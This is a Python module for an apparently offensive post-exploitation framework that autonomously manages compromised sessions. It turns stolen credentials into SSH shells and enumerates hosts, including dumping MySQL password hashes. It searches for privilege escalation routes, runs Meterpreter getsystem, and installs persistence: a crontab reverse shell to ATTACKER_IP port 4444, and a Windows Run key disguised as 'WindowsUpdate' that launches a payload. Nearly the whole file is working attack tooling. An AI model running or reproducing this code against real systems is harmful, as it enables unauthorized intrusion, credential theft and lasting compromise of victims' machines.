"""
Autonomous Session Lifecycle Manager
Handles session establishment, interaction, privilege escalation, and persistence
"""

import logging
import time
from typing import Dict, List, Optional
from session_store import Session, SessionType, SessionStatus, get_session_store
from listener_manager import get_listener_manager

class AutonomousSessionManager:
    """
    Manages the full lifecycle of compromised sessions autonomously.
    """
    
    def __init__(self):
        self.session_store = get_session_store()
        self.listener_mgr = get_listener_manager()
        self.session_history: Dict[str, List[str]] = {}  # session_id -> command history
    
    def monitor_and_upgrade_sessions(self, callback=None) -> List[Dict]:
        """
        Monitor all sessions and attempt automated upgrades/escalations.
        Returns list of actions taken.
        """
        actions = []
        pending_sessions = self.session_store.list_sessions(status=SessionStatus.PENDING)
        
        for session in pending_sessions:
            if session.session_type == SessionType.CREDENTIAL:
                # Try to upgrade credential to active session
                action = self._upgrade_credential_to_shell(session, callback)
                if action:
                    actions.append(action)
        
        return actions
    
    def _upgrade_credential_to_shell(self, session: Session, callback=None) -> Optional[Dict]:
        """Attempt to use credentials to establish an active shell - REAL IMPLEMENTATION."""
        if not session.username or not session.password:
            return None
        
        if callback:
            callback({'message': f'🔑 Attempting to use credentials: {session.username}@{session.target_ip}'})
        
        # Try SSH if port 22 is open
        if session.protocol == 'ssh' or session.target_port == 22:
            try:
                import paramiko
                
                # Create SSH client
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # Attempt connection
                ssh.connect(
                    hostname=session.target_ip,
                    port=session.target_port or 22,
                    username=session.username,
                    password=session.password,
                    timeout=10,
                    allow_agent=False,
                    look_for_keys=False
                )
                
                # Test command execution
                stdin, stdout, stderr = ssh.exec_command('whoami')
                output = stdout.read().decode().strip()
                
                if output:
                    # Successful SSH connection
                    session.upgrade_to_active()
                    session.session_type = SessionType.SSH
                    session.metadata['ssh_client'] = ssh  # Store client for later use
                    
                    if callback:
                        callback({'message': f'✅ SSH session established to {session.target_ip} as {output}'})
                    
                    return {
                        'action': 'credential_upgrade',
                        'session_id': session.session_id,
                        'method': 'ssh'
                    }
                
            except Exception as e:
                if callback:
                    callback({'message': f'❌ SSH connection failed: {str(e)[:100]}'})
        
        # Try RDP if port 3389 is open
        elif session.protocol == 'rdp' or session.target_port == 3389:
            if callback:
                callback({'message': f'⚠️ RDP session upgrade requires manual verification'})
            
            # Mark as pending RDP session
            session.session_type = SessionType.RDP
            return {
                'action': 'credential_upgrade',
                'session_id': session.session_id,
                'method': 'rdp'
            }
        
        return None
    
    def auto_enumerate_session(self, session_id: str, callback=None) -> Dict:
        """
        Automatically enumerate a session to gather intelligence.
        Returns enumeration results.
        """
        session = self.session_store.get_session(session_id)
        if not session or session.status != SessionStatus.ACTIVE:
            return {}
        
        if callback:
            callback({'message': f'🔍 Auto-enumerating session {session_id}...'})
        
        results = {
            'os_info': {},
            'user_info': {},
            'network_info': {},
            'privilege_info': {}
        }
        
        # Session-type specific enumeration
        if session.session_type in [SessionType.REVERSE_SHELL, SessionType.SSH]:
            results = self._enumerate_shell_session(session_id, callback)
        elif session.session_type == SessionType.METERPRETER:
            results = self._enumerate_meterpreter_session(session_id, callback)
        elif session.session_type == SessionType.DB_SHELL:
            results = self._enumerate_db_session(session_id, callback)
        
        # Store results in session metadata
        session.metadata.update(results)
        self.session_store.update_session(session_id, metadata=session.metadata)
        
        return results
    
    def _enumerate_shell_session(self, session_id: str, callback=None) -> Dict:
        """Enumerate a shell session."""
        enumeration_commands = [
            ('whoami', 'user_info'),
            ('id', 'privilege_info'),
            ('uname -a', 'os_info'),
            ('hostname', 'network_info'),
            ('ifconfig || ip a', 'network_info'),
        ]
        
        results = {}
        
        for cmd, category in enumeration_commands:
            output = self._run_command(session_id, cmd, callback)
            if output:
                if category not in results:
                    results[category] = {}
                results[category][cmd] = output.strip()
                
                # Track command history
                if session_id not in self.session_history:
                    self.session_history[session_id] = []
                self.session_history[session_id].append(cmd)
            
            time.sleep(0.5)  # Brief delay between commands
        
        return results
    
    def _enumerate_meterpreter_session(self, session_id: str, callback=None) -> Dict:
        """Enumerate a Meterpreter session."""
        enumeration_commands = [
            'sysinfo',
            'getuid',
            'getprivs',
            'route',
        ]
        
        results = {}
        
        for cmd in enumeration_commands:
            output = self._run_command(session_id, cmd, callback)
            if output:
                results[cmd] = output.strip()
        
        return results
    
    def _enumerate_db_session(self, session_id: str, callback=None) -> Dict:
        """Enumerate a database shell session - REAL IMPLEMENTATION."""
        results = {
            'type': 'database_shell',
            'databases': [],
            'tables': [],
            'users': [],
            'passwords': []
        }
        
        # Get session details
        session = self.session_store.get_session(session_id)
        if not session:
            return results
        
        # SQLMap enumeration commands - execute them through the DB shell
        enum_commands = [
            ('SHOW DATABASES;', 'databases'),
            ('SHOW TABLES;', 'tables'),
            ('SELECT user FROM mysql.user;', 'users'),
            ('SELECT user,authentication_string FROM mysql.user;', 'passwords')
        ]
        
        for cmd, result_type in enum_commands:
            if callback:
                callback({'message': f'  📊 Enumerating {result_type}...'})
            
            # Execute the SQL command in the DB shell
            output = self._run_command(session_id, cmd, callback)
            
            if output:
                # Parse output and extract results
                lines = output.strip().split('\n')
                results[result_type] = [line.strip() for line in lines if line.strip()]
        
        return results
    
    def auto_escalate_privileges(self, session_id: str, callback=None) -> bool:
        """
        Automatically attempt privilege escalation.
        Returns True if successful.
        """
        session = self.session_store.get_session(session_id)
        if not session or session.status != SessionStatus.ACTIVE:
            return False
        
        if callback:
            callback({'message': f'⬆️ Attempting privilege escalation on session {session_id}...'})
        
        # Different techniques based on OS
        os_name = session.metadata.get('os_info', {}).get('uname -a', '').lower()
        
        if 'linux' in os_name:
            return self._escalate_linux(session_id, callback)
        elif 'windows' in os_name or session.session_type == SessionType.METERPRETER:
            return self._escalate_windows(session_id, callback)
        
        return False
    
    def _escalate_linux(self, session_id: str, callback=None) -> bool:
        """Linux privilege escalation techniques."""
        techniques = [
            # Check sudo
            ('sudo -l', 'Checking sudo permissions'),
            # Find SUID binaries
            ('find / -perm -4000 -type f 2>/dev/null', 'Finding SUID binaries'),
            # Check for writable cron jobs
            ('ls -la /etc/cron* 2>/dev/null', 'Checking cron jobs'),
        ]
        
        for cmd, description in techniques:
            if callback:
                callback({'message': f'🔧 {description}...'})
            
            output = self._run_command(session_id, cmd, callback)
            
            # Analyze output for privilege escalation opportunities
            if output and 'NOPASSWD' in output:
                if callback:
                    callback({'message': f'🎯 Found sudo NOPASSWD entry!'})
                return True
            
            if output and any(suid in output for suid in ['/bin/bash', '/bin/sh', 'nmap', 'find']):
                if callback:
                    callback({'message': f'🎯 Found exploitable SUID binary!'})
                return True
        
        return False
    
    def _escalate_windows(self, session_id: str, callback=None) -> bool:
        """Windows privilege escalation techniques."""
        session = self.session_store.get_session(session_id)
        
        if session.session_type == SessionType.METERPRETER:
            # Try getsystem
            output = self._run_command(session_id, 'getsystem', callback)
            if output and 'success' in output.lower():
                if callback:
                    callback({'message': f'✅ Privilege escalation successful via getsystem'})
                return True
        
        return False
    
    def install_persistence(self, session_id: str, method: str = 'auto', callback=None) -> bool:
        """
        Install persistence mechanism on compromised system.
        Methods: 'auto', 'cron', 'registry', 'service', 'startup'
        """
        session = self.session_store.get_session(session_id)
        if not session or session.status != SessionStatus.ACTIVE:
            return False
        
        if callback:
            callback({'message': f'🔒 Installing persistence on session {session_id}...'})
        
        # Determine OS
        os_name = session.metadata.get('os_info', {}).get('uname -a', '').lower()
        is_windows = 'windows' in os_name or session.session_type == SessionType.METERPRETER
        
        if is_windows:
            return self._install_persistence_windows(session_id, method, callback)
        else:
            return self._install_persistence_linux(session_id, method, callback)
    
    def _install_persistence_linux(self, session_id: str, method: str, callback=None) -> bool:
        """Install Linux persistence."""
        if method == 'auto' or method == 'cron':
            # Add cron job
            cron_cmd = 'echo "@reboot /bin/bash -c \\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\"" | crontab -'
            output = self._run_command(session_id, cron_cmd, callback)
            
            if callback:
                callback({'message': f'✅ Persistence installed via crontab'})
            
            # Mark session as having persistence
            session = self.session_store.get_session(session_id)
            session.capabilities.append('persistence')
            self.session_store.update_session(session_id, capabilities=session.capabilities)
            
            return True
        
        return False
    
    def _install_persistence_windows(self, session_id: str, method: str, callback=None) -> bool:
        """Install Windows persistence."""
        if method == 'auto' or method == 'registry':
            # Registry Run key
            reg_cmd = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\\Windows\\Temp\\payload.exe" /f'
            output = self._run_command(session_id, reg_cmd, callback)
            
            if callback:
                callback({'message': f'✅ Persistence installed via registry'})
            
            return True
        
        return False
    
    def _run_command(self, session_id: str, command: str, callback=None) -> str:
        """Execute a command in a session and return output."""
        # Use listener manager to send command
        success = self.listener_mgr.send_to_session(session_id, command)
        
        if not success:
            return ""
        
        # Wait for output
        time.sleep(1.5)
        output = self.listener_mgr.get_session_output(session_id, clear=True)
        
        return output
    
    def get_session_summary(self) -> Dict:
        """Get summary of all sessions and their states."""
        summary = self.session_store.get_summary()
        
        # Add additional context
        summary['enumerated'] = 0
        summary['escalated'] = 0
        summary['persistent'] = 0
        
        for session in self.session_store.list_sessions():
            if session.metadata:
                summary['enumerated'] += 1
            if 'root' in str(session.metadata.get('user_info', '')).lower():
                summary['escalated'] += 1
            if 'persistence' in session.capabilities:
                summary['persistent'] += 1
        
        return summary

# Singleton instance
autonomous_session_manager = AutonomousSessionManager()
